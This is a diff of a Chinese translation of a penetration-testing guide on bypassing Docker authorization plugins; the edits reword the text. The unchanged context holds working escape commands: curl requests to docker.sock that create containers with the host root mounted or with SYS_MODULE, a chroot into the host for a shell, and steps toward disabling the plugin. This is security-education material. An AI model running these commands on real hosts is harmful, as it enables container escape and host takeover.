@@ -16,15 +16,15 @@ Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/
 
 ![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)
 
-每个发送到插件的请求 **包括经过身份验证的用户、HTTP 头和请求/响应主体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应主体都发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应主体会被发送。
+每个发送到插件的请求 **包括经过身份验证的用户、HTTP 头和请求/响应体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应体都会发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应体会被发送。
 
-对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，如 `logs` 和 `events`，仅 HTTP 请求会发送到授权插件。
+对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，如 `logs` 和 `events`，仅发送 HTTP 请求到授权插件。
 
 在请求/响应处理期间，一些授权流程可能需要对 Docker 守护进程进行额外查询。为了完成这些流程，插件可以像普通用户一样调用守护进程 API。为了启用这些额外查询，插件必须提供管理员配置适当身份验证和安全策略的手段。
 
 ## 多个插件
 
-您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。这个链可以是有序的。每个对守护进程的请求按顺序通过链。只有当 **所有插件都授予对资源的访问** 时，访问才会被授予。
+您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。这个链可以是有序的。每个请求按顺序通过链传递。只有当 **所有插件都授予访问** 资源时，访问才会被授予。
 
 # 插件示例
 
@@ -122,7 +122,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 
 ### HostConfig 中的 Binds
 
-按照与 **根中的 Binds** 相同的指示，向 Docker API 执行此 **请求**：
+按照与 **根中的 Binds** 相同的指示，向 Docker API 发送此 **请求**：
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
@@ -140,7 +140,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ## 未检查的 JSON 属性
 
-系统管理员在配置 docker 防火墙时，**可能忘记了某个参数的重要属性**，例如在 "**HostConfig**" 中的 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**"。在以下示例中，可以利用此错误配置创建并运行具有 **SYS_MODULE** 能力的容器：
+系统管理员在配置 docker 防火墙时，**可能忘记了某个参数的重要属性**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**" 在 "**HostConfig**" 内。以下示例中，可以利用此错误配置创建并运行具有 **SYS_MODULE** 能力的容器：
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -151,11 +151,11 @@ capsh --print
 #You can abuse the SYS_MODULE capability
 ```
 > [!NOTE]
-> **`HostConfig`** 通常是包含 **有趣的** **权限** 的关键，可以用来逃离容器。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并且可能允许你绕过限制。
+> **`HostConfig`** 通常是包含 **有趣的** **权限** 以逃离容器的关键。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并可能允许您绕过限制。
 
 ## 禁用插件
 
-如果 **sysadmin** **忘记** **禁止** 禁用 **插件** 的能力，你可以利用这一点来完全禁用它！
+如果 **sysadmin** **忘记** **禁止** 禁用 **插件** 的能力，您可以利用这一点完全禁用它！
 ```bash
 docker plugin list #Enumerate plugins
 
